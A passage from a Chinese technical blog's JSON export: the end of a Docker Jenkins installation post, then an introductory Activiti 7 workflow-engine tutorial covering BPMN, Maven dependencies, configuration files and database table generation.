Corporation, runtime: /usr/java/jdk1.8.0_301/jreDefault locale: en_US, platform encoding: UTF-8OS name: &quot;linux&quot;, version: &quot;3.10.0-1127.el7.x86_64&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot;[root@localhost local]# 到此 JDK、Maven 环境准备完成 # 7、* 启动容器，并 ** 挂载上面配置的环境 * 123456789docker run \\-u root \\-d \\--restart=always \\-p 8001:8080 \\-p 50000:50000 \\-v /var/run/docker.sock:/var/run/docker.sock \\-v /var/jenkins_home:/var/jenkins_home \\jenkinsci/blueocean # 9、访问 Jenkins，提示输入密码 # 10、初次可以选择推荐的 # 11、 等待安装 # 12、如下访问 Jenkins 成功啦 到此就结束 Docker 安装 Jenkins 啦，后面的章节将介绍如何配置 jenkins，敬请期待！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/05/%E3%80%90Docker%E3%80%91Docker%E5%AE%89%E8%A3%85Jenkins/"},{"title":"【Activiti】Java工作流引擎 Activiti 万字详细入门","text":"# 【Activiti】Java 工作流引擎 Activiti 万字详细入门 # Activiti7 # 一、工作流介绍 # 1.1 概念 工作流 (Workflow)，就是通过计算机对业务流程自动化执行管理。它主要解决的是 “使在多个参与者之间按照某种预定义的规则自动进行传递文档、信息或任务的过程，从而实现某个预期的业务目标，或者促使此目标的实现”。 # 1.2 工作流系统 一个软件系统中具有工作流的功能，我们把它称为工作流系统，一个系统中工作流的功能是什么？就是对系统的业务流程进行自动化管理，所以工作流是建立在业务流程的基础上，所以一个软件的系统核心根本上还是系统的业务流程，工作流只是协助进行业务流程管理。即使没有工作流业务系统也可以开发运行，只不过有了工作流可以更好的管理业务流程，提高系统的可扩展性。 # 1.3 适用行业 消费品行业，制造业，电信服务业，银证险等金融服务业，物流服务业，物业服务业，物业管理，大中型进出口贸易公司，政府事业机构，研究院所及教育服务业等，特别是大的跨国企业和集团公司。 # 1.4 具体应用 1、关键业务流程：订单、报价处理、合同审核、客户电话处理、供应链管理等 2、行政管理类：出差申请、加班申请、请假申请、用车申请、各种办公用品申请、购买申请、日报周报等凡是原来手工流转处理的行政表单。 3、人事管理类：员工培训安排、绩效考评、职位变动处理、员工档案信息管理等。 4、财务相关类：付款请求、应收款处理、日常报销处理、出差报销、预算和计划申请等。 5、客户服务类：客户信息管理、客户投诉、请求处理、售后服务管理等。 6、特殊服务类：ISO 系列对应流程、质量管理对应流程、产品数据信息管理、贸易公司报关处理、物流公司货物跟踪处理等各种通过表单逐步手工流转完成的任务均可应用工作流软件自动规范地实施。 # 1.5 实现方式 在没有专门的工作流引擎之前，我们之前为了实现流程控制，通常的做法就是采用状态字段的值来跟踪流程的变化情况。这样不同角色的用户，通过状态字段的取值来决定记录是否显示。 针对有权限可以查看的记录，当前用户根据自己的角色来决定审批是否合格的操作。如果合格将状态字段设置一个值，来代表合格；当然如果不合格也需要设置一个值来代表不合格的情况。 这是一种最为原始的方式。通过状态字段虽然做到了流程控制，但是当我们的流程发生变更的时候，这种方式所编写的代码也要进行调整。 那么有没有专业的方式来实现工作流的管理呢？并且可以做到业务流程变化之后，我们的程序可以不用改变，如果可以实现这样的效果，那么我们的业务系统的适应能力就得到了极大提升。 # 二、Activiti7 概述 # 2.1 介绍 Alfresco 软件在 2010 年 5 月 17 日宣布 Activiti 业务流程管理（BPM）开源项目的正式启动，其首席架构师由业务流程管理 BPM 的专家 Tom Baeyens 担任，Tom Baeyens 就是原来 jbpm 的架构师，而 jbpm 是一个非常有名的工作流引擎，当然 activiti 也是一个工作流引擎。 Activiti 是一个工作流引擎， activiti 可以将业务系统中复杂的业务流程抽取出来，使用专门的建模语言 BPMN2.0 进行定义，业务流程按照预先定义的流程进行执行，实现了系统的流程由 activiti 进行管理，减少业务系统由于流程变更进行系统升级改造的工作量，从而提高系统的健壮性，同时也减少了系统开发维护成本。 官方网站：https://www.activiti.org/ 经历的版本: 目前最新版本：Activiti7.0.0.Beta # 2.1.1 BPM BPM（Business Process Management），即业务流程管理，是一种规范化的构造端到端的业务流程，以持续的提高组织业务效率。常见商业管理教育如 EMBA、MBA 等均将 BPM 包含在内。 # 2.1.2 BPM 软件 BPM 软件就是根据企业中业务环境的变化，推进人与人之间、人与系统之间以及系统与系统之间的整合及调整的经营方法与解决方案的 IT 工具。 通过 BPM 软件对企业内部及外部的业务流程的整个生命周期进行建模、自动化、管理监控和优化，使企业成本降低，利润得以大幅提升。 BPM 软件在企业中应用领域广泛，凡是有业务流程的地方都可以 BPM 软件进行管理，比如企业人事办公管理、采购流程管理、公文审批流程管理、财务管理等。 # 2.1.3 BPMN BPMN（Business Process Model AndNotation）- 业务流程模型和符号 是由 BPMI（BusinessProcess Management Initiative）开发的一套标准的业务流程建模符号，使用 BPMN 提供的符号可以创建业务流程。 2004 年 5 月发布了 BPMN1.0 规范.BPMI 于 2005 年 9 月并入 OMG（The Object Management Group 对象管理组织) 组织。OMG 于 2011 年 1 月发布 BPMN2.0 的最终版本。 具体发展历史如下: BPMN 是目前被各 BPM 厂商广泛接受的 BPM 标准。Activiti 就是使用 BPMN 2.0 进行流程建模、流程执行管理，它包括很多的建模符号，比如： Event 用一个圆圈表示，它是流程中运行过程中发生的事情。 活动用圆角矩形表示，一个流程由一个活动或多个活动组成 Bpmn 图形其实是通过 xml 表示业务流程，上边的.bpmn 文件使用文本编辑器打开： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;definitions xmlns=&quot;http://www.omg.org/spec/BPMN/20100524/MODEL&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:activiti=&quot;http://activiti.org/bpmn&quot; xmlns:bpmndi=&quot;http://www.omg.org/spec/BPMN/20100524/DI&quot; xmlns:omgdc=&quot;http://www.omg.org/spec/DD/20100524/DC&quot; xmlns:omgdi=&quot;http://www.omg.org/spec/DD/20100524/DI&quot; typeLanguage=&quot;http://www.w3.org/2001/XMLSchema&quot; expressionLanguage=&quot;http://www.w3.org/1999/XPath&quot; targetNamespace=&quot;http://www.activiti.org/test&quot;&gt; &lt;process id=&quot;myProcess&quot; name=&quot;My process&quot; isExecutable=&quot;true&quot;&gt; &lt;startEvent id=&quot;startevent1&quot; name=&quot;Start&quot;&gt;&lt;/startEvent&gt; &lt;userTask id=&quot;usertask1&quot; name=&quot;创建请假单&quot;&gt;&lt;/userTask&gt; &lt;sequenceFlow id=&quot;flow1&quot; sourceRef=&quot;startevent1&quot; targetRef=&quot;usertask1&quot;&gt;&lt;/sequenceFlow&gt; &lt;userTask id=&quot;usertask2&quot; name=&quot;部门经理审核&quot;&gt;&lt;/userTask&gt; &lt;sequenceFlow id=&quot;flow2&quot; sourceRef=&quot;usertask1&quot; targetRef=&quot;usertask2&quot;&gt;&lt;/sequenceFlow&gt; &lt;userTask id=&quot;usertask3&quot; name=&quot;人事复核&quot;&gt;&lt;/userTask&gt; &lt;sequenceFlow id=&quot;flow3&quot; sourceRef=&quot;usertask2&quot; targetRef=&quot;usertask3&quot;&gt;&lt;/sequenceFlow&gt; &lt;endEvent id=&quot;endevent1&quot; name=&quot;End&quot;&gt;&lt;/endEvent&gt; &lt;sequenceFlow id=&quot;flow4&quot; sourceRef=&quot;usertask3&quot; targetRef=&quot;endevent1&quot;&gt;&lt;/sequenceFlow&gt; &lt;/process&gt; &lt;bpmndi:BPMNDiagram id=&quot;BPMNDiagram_myProcess&quot;&gt; &lt;bpmndi:BPMNPlane bpmnElement=&quot;myProcess&quot; id=&quot;BPMNPlane_myProcess&quot;&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;startevent1&quot; id=&quot;BPMNShape_startevent1&quot;&gt; &lt;omgdc:Bounds height=&quot;35.0&quot; width=&quot;35.0&quot; x=&quot;130.0&quot; y=&quot;160.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;usertask1&quot; id=&quot;BPMNShape_usertask1&quot;&gt; &lt;omgdc:Bounds height=&quot;55.0&quot; width=&quot;105.0&quot; x=&quot;210.0&quot; y=&quot;150.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;usertask2&quot; id=&quot;BPMNShape_usertask2&quot;&gt; &lt;omgdc:Bounds height=&quot;55.0&quot; width=&quot;105.0&quot; x=&quot;360.0&quot; y=&quot;150.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;usertask3&quot; id=&quot;BPMNShape_usertask3&quot;&gt; &lt;omgdc:Bounds height=&quot;55.0&quot; width=&quot;105.0&quot; x=&quot;510.0&quot; y=&quot;150.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;endevent1&quot; id=&quot;BPMNShape_endevent1&quot;&gt; &lt;omgdc:Bounds height=&quot;35.0&quot; width=&quot;35.0&quot; x=&quot;660.0&quot; y=&quot;160.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow1&quot; id=&quot;BPMNEdge_flow1&quot;&gt; &lt;omgdi:waypoint x=&quot;165.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;210.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow2&quot; id=&quot;BPMNEdge_flow2&quot;&gt; &lt;omgdi:waypoint x=&quot;315.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;360.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow3&quot; id=&quot;BPMNEdge_flow3&quot;&gt; &lt;omgdi:waypoint x=&quot;465.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;510.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow4&quot; id=&quot;BPMNEdge_flow4&quot;&gt; &lt;omgdi:waypoint x=&quot;615.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;660.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;/bpmndi:BPMNPlane&gt; &lt;/bpmndi:BPMNDiagram&gt;&lt;/definitions&gt; # 2.2 使用步骤 # 部署 activiti Activiti 是一个工作流引擎（其实就是一堆 jar 包 API），业务系统访问 (操作) activiti 的接口，就可以方便的操作流程相关数据，这样就可以把工作流环境与业务系统的环境集成在一起。 # 流程定义 使用 activiti 流程建模工具 (activity-designer) 定义业务流程 (.bpmn 文件) 。 .bpmn 文件就是业务流程定义文件，通过 xml 定义业务流程。 # 流程定义部署 activiti 部署业务流程定义（.bpmn 文件）。 使用 activiti 提供的 api 把流程定义内容存储起来，在 Activiti 执行过程中可以查询定义的内容 Activiti 执行把流程定义内容存储在数据库中 # 启动一个流程实例 流程实例也叫：ProcessInstance 启动一个流程实例表示开始一次业务流程的运行。 在员工请假流程定义部署完成后，如果张三要请假就可以启动一个流程实例，如果李四要请假也启动一个流程实例，两个流程的执行互相不影响。 # 用户查询待办任务 (Task) 因为现在系统的业务流程已经交给 activiti 管理，通过 activiti 就可以查询当前流程执行到哪了，当前用户需要办理什么任务了，这些 activiti 帮我们管理了，而不需要开发人员自己编写在 sql 语句查询。 # 用户办理任务 用户查询待办任务后，就可以办理某个任务，如果这个任务办理完成还需要其它用户办理，比如采购单创建后由部门经理审核，这个过程也是由 activiti 帮我们完成了。 # 流程结束 当任务办理完成没有下一个任务结点了，这个流程实例就完成了。 # 三、Activiti 环境 # 3.1 开发环境 Jdk1.8 或以上版本 Mysql 5 及以上的版本 Tomcat8.5 IDEA 注意：activiti 的流程定义工具插件可以安装在 IDEA 下，也可以安装在 Eclipse 工具下 # 3.2 Activiti 环境 我们使用：Activiti7.0.0.Beta1 默认支持 spring5 # 3.2.1 下载 activiti7 Activiti 下载地址：http://activiti.org/download.html ，Maven 的依赖如下： 1234567891011&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-dependencies&lt;/artifactId&gt; &lt;version&gt;7.0.0.Beta1&lt;/version&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 1) Database： activiti 运行需要有数据库的支持，支持的数据库有：h2, mysql, oracle, postgres, mssql, db2。 # 3.2.2 流程设计器 IDEA 下安装 在 IDEA 的 File 菜单中找到子菜单”Settings”, 后面我们再选择左侧的 “plugins” 菜单，如下图所示： 此时我们就可以搜索到 actiBPM 插件，它就是 Activiti Designer 的 IDEA 版本，我们点击 Install 安装。 安装好后，页面如下： 提示需要重启 idea，点击重启。 重启完成后，再次打开 Settings 下的 Plugins（插件列表），点击右侧的 Installed（已安装的插件），在列表中看到 actiBPM，就说明已经安装成功了，如下图所示： 后面的课程里，我们会使用这个流程设计器进行 Activiti 的流程设计。 # 3.3 Activiti 的数据库支持 Activiti 在运行时需要数据库的支持，使用 25 张表，把流程定义节点内容读取到数据库表中，以供后续使用。 # 3.3.1 Activiti 支持的数据库 activiti 支持的数据库和版本如下： 数据库类型 版本 JDBC 连接示例 说明 h2 1.3.168 jdbc:h2:tcp://localhost/activiti 默认配置的数据库 mysql 5.1.21 jdbc:mysql://localhost:3306/activiti?autoReconnect=true 使用 mysql-connector-java 驱动测试 oracle 11.2.0.1.0 jdbc:oracle:thin:@localhost:1521:xe postgres 8.1 jdbc:postgresql://localhost:5432/activiti db2 DB2 10.1 using db2jcc4 jdbc:db2://localhost:50000/activiti mssql 2008 using sqljdbc4 jdbc:sqlserver://localhost:1433/activiti # 3.3.2 在 MySQL 生成表 # 3.3.2.1 创建数据库 创建 mysql 数据库 activiti （名字任意）： CREATE DATABASE activiti DEFAULT CHARACTER SET utf8; # 3.3.2.2 使用 java 代码生成表 # 1） 创建 java 工程 使用 idea 创建 java 的 maven 工程，取名：activiti01。 # 2） 加入 maven 依赖的坐标（jar 包） 首先需要在 java 工程中加入 ProcessEngine 所需要的 jar 包，包括： activiti-engine-7.0.0.beta1.jar activiti 依赖的 jar 包： mybatis、 alf4j、 log4j 等 activiti 依赖的 spring 包 mysql 数据库驱动 第三方数据连接池 dbcp 单元测试 Junit-4.12.jar 我们使用 maven 来实现项目的构建，所以应当导入这些 jar 所对应的坐标到 pom.xml 文件中。 完整的依赖内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;properties&gt; &lt;slf4j.version&gt;1.6.6&lt;/slf4j.version&gt; &lt;log4j.version&gt;1.2.12&lt;/log4j.version&gt; &lt;activiti.version&gt;7.0.0.Beta1&lt;/activiti.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-engine&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-spring&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn 模型处理 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-bpmn-model&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn 转换 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-bpmn-converter&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn json数据转换 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-json-converter&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn 布局 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-bpmn-layout&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- activiti 云支持 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti.cloud&lt;/groupId&gt; &lt;artifactId&gt;activiti-cloud-services-api&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mysql驱动 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.40&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 链接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-dbcp&lt;/groupId&gt; &lt;artifactId&gt;commons-dbcp&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;/dependency&gt; &lt;!-- log start --&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; # 3） 添加 log4j 日志配置 我们使用 log4j 日志包，可以对日志进行配置 在 resources 下创建 log4j.properties 123456789101112131415# Set root category priority to INFO and its only appender to CONSOLE.#log4j.rootCategory=INFO, CONSOLE debug info warn error fatallog4j.rootCategory=debug, CONSOLE, LOGFILE# Set the enterprise logger category to FATAL and its only appender to CONSOLE.log4j.logger.org.apache.axis.enterprise=FATAL, CONSOLE# CONSOLE is set to be a ConsoleAppender using a PatternLayout.log4j.appender.CONSOLE=org.apache.log4j.ConsoleAppenderlog4j.appender.CONSOLE.layout=org.apache.log4j.PatternLayoutlog4j.appender.CONSOLE.layout.ConversionPattern=%d{ISO8601} %-6r[%15.15t] %-5p %30.30c %x - %m\\n# LOGFILE is set to be a File appender using a PatternLayout.log4j.appender.LOGFILE=org.apache.log4j.FileAppenderlog4j.appender.LOGFILE.File=f:\\act\\activiti.loglog4j.appender.LOGFILE.Append=truelog4j.appender.LOGFILE.layout=org.apache.log4j.PatternLayoutlog4j.appender.LOGFILE.layout.ConversionPattern=%d{ISO8601} %-6r[%15.15t] %-5p %30.30c %x - %m\\n # 4） 添加 activiti 配置文件 我们使用 activiti 提供的默认方式来创建 mysql 的表。 默认方式的要求是在 resources 下创建 activiti.cfg.xml 文件，注意：默认方式目录和文件名不能修改，因为 activiti 的源码中已经设置，到固定的目录读取固定文件名的文件。 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;xmlns:context=&quot;http://www.springframework.org/schema/context&quot;xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;&lt;/beans&gt; # 5） 在 activiti.cfg.xml 中进行配置 默认方式要在在 activiti.cfg.xml 中 bean 的名字叫 processEngineConfiguration，名字不可修改 在这里有 2 中配置方式：一种是单独配置数据源，一种是不单独配置数据源 # 1、直接配置 processEngineConfiguration processEngineConfiguration 用来创建 ProcessEngine，在创建 ProcessEngine 时会执行数据库的操作。 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt; &lt;!-- 默认id对应的值 为processEngineConfiguration --&gt; &lt;!-- processEngine Activiti的流程引擎 --&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;property name=&quot;jdbcDriver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;jdbcUrl&quot; value=&quot;jdbc:mysql:///activiti&quot;/&gt; &lt;property name=&quot;jdbcUsername&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;jdbcPassword&quot; value=&quot;123456&quot;/&gt; &lt;!-- activiti数据库表处理策略 --&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; # 2、配置数据源后，在 processEngineConfiguration 引用 首先配置数据源 123456789101112131415161718192021222324252627282930&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt; &lt;!-- 这里可以使用 链接池 dbcp--&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///activiti&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;123456&quot; /&gt; &lt;property name=&quot;maxActive&quot; value=&quot;3&quot; /&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;1&quot; /&gt; &lt;/bean&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;!-- 引用数据源 上面已经设置好了--&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;!-- activiti数据库表处理策略 --&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; # 6） java 类编写程序生成表 创建一个测试类，调用 activiti 的工具类，生成 acitivti 需要的数据库表。 直接使用 activiti 提供的工具类 ProcessEngines，会默认读取 classpath 下的 activiti.cfg.xml 文件，读取其中的数据库配置，创建 ProcessEngine，在创建 ProcessEngine 时会自动创建表。 代码如下： 1234567891011121314151617package com.itheima.activiti01.test;import org.activiti.engine.ProcessEngine;import org.activiti.engine.ProcessEngineConfiguration;import org.junit.Test;public class TestDemo { /** * 生成 activiti的数据库表 */ @Test public void testCreateDbTable() { //使用classpath下的activiti.cfg.xml中的配置创建processEngine ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine(); System.out.println(processEngine); }} 说明： 1、运行以上程序段即可完成 activiti 表创建，通过改变 activiti.cfg.xml 中 databaseSchemaUpdate 参数的值执行不同的数据表处理策略。 2 、 上 边 的 方法 getDefaultProcessEngine 方法在执行时，从 activiti.cfg.xml 中找固定的名称 processEngineConfiguration 。 在测试程序执行过程中，idea 的控制台会输出日志，说明程序正在创建数据表，类似如下，注意红线内容： 执行完成后我们查看数据库， 创建了 25 张表，结果如下： 到这，我们就完成 activiti 运行需要的数据库和表的创建。 # 3.4 表结构介绍 # 3.4.1 表的命名规则和作用 看到刚才创建的表，我们发现 Activiti 的表都以 ACT_ 开头。 第二部分是表示表的用途的两个字母标识。 用途也和服务的 API 对应。 ACT_RE ：'RE’表示 repository。 这个前缀的表包含了流程定义和流程静态资源 （图片，规则，等等）。 ACT_RU：'RU’表示 runtime。 这些运行时的表，包含流程实例，任务，变量，异步任务，等运行中的数据。 Activiti 只在流程实例执行过程中保存这些数据， 在流程结束时就会删除这些记录。 这样运行时表可以一直很小速度很快。 ACT_HI：'HI’表示 history。 这些表包含历史数据，比如历史流程实例， 变量，任务等等。 ACT_GE ： GE 表示 general。 通用数据， 用于不同场景下 # 3.4.2 Activiti 数据表介绍 表分类 表名 解释 一般数据 [ACT_GE_BYTEARRAY] 通用的流程定义和流程资源 [ACT_GE_PROPERTY] 系统相关属性 流程历史记录 [ACT_HI_ACTINST] 历史的流程实例 [ACT_HI_ATTACHMENT] 历史的流程附件 [ACT_HI_COMMENT] 历史的说明性信息 [ACT_HI_DETAIL] 历史的流程运行中的细节信息 [ACT_HI_IDENTITYLINK] 历史的流程运行过程中用户关系 [ACT_HI_PROCINST] 历史的流程实例 [ACT_HI_TASKINST] 历史的任务实例 [ACT_HI_VARINST] 历史的流程运行中的变量信息 流程定义表 [ACT_RE_DEPLOYMENT] 部署单元信息 [ACT_RE_MODEL] 模型信息 [ACT_RE_PROCDEF] 已部署的流程定义 运行实例表 [ACT_RU_EVENT_SUBSCR] 运行时事件 [ACT_RU_EXECUTION] 运行时流程执行实例 [ACT_RU_IDENTITYLINK] 运行时用户关系信息，存储任务节点与参与者的相关信息 [ACT_RU_JOB] 运行时作业 [ACT_RU_TASK] 运行时任务 [ACT_RU_VARIABLE] 运行时变量表 # 四、Activiti 类关系图 上面我们完成了 Activiti 数据库表的生成，java 代码中我们调用 Activiti 的工具类，下面来了解 Activiti 的类关系 # 4.1 类关系图 在新版本中，我们通过实验可以发现 IdentityService，FormService 两个 Serivce 都已经删除了。 所以后面我们对于这两个 Service 也不讲解了，但老版本中还是有这两个 Service，同学们需要了解一下 # 4.2 activiti.cfg.xml activiti 的引擎配置文件，包括：ProcessEngineConfiguration 的定义、数据源定义、事务管理器等，此文件其实就是一个 spring 配置文件。 # 4.3 流程引擎配置类 流程引擎的配置类（ProcessEngineConfiguration），通过 ProcessEngineConfiguration 可以创建工作流引擎 ProceccEngine，常用的两种方法如下： # 4.3.1 StandaloneProcessEngineConfiguration 使用 StandaloneProcessEngineConfigurationActiviti 可以单独运行，来创建 ProcessEngine，Activiti 会自己处理事务。 配置文件方式： 通常在 activiti.cfg.xml 配置文件中定义一个 id 为 processEngineConfiguration 的 bean. 方法如下： 1234567891011121314&lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;!--配置数据库相关的信息--&gt; &lt;!--数据库驱动--&gt; &lt;property name=&quot;jdbcDriver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;!--数据库链接--&gt; &lt;property name=&quot;jdbcUrl&quot; value=&quot;jdbc:mysql:///activiti&quot;/&gt; &lt;!--数据库用户名--&gt; &lt;property name=&quot;jdbcUsername&quot; value=&quot;root&quot;/&gt; &lt;!--数据库密码--&gt; &lt;property name=&quot;jdbcPassword&quot; value=&quot;123456&quot;/&gt; &lt;!--actviti数据库表在生成时的策略 true - 如果数据库中已经存在相应的表，那么直接使用，如果不存在，那么会创建--&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt; 还可以加入连接池: 12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; 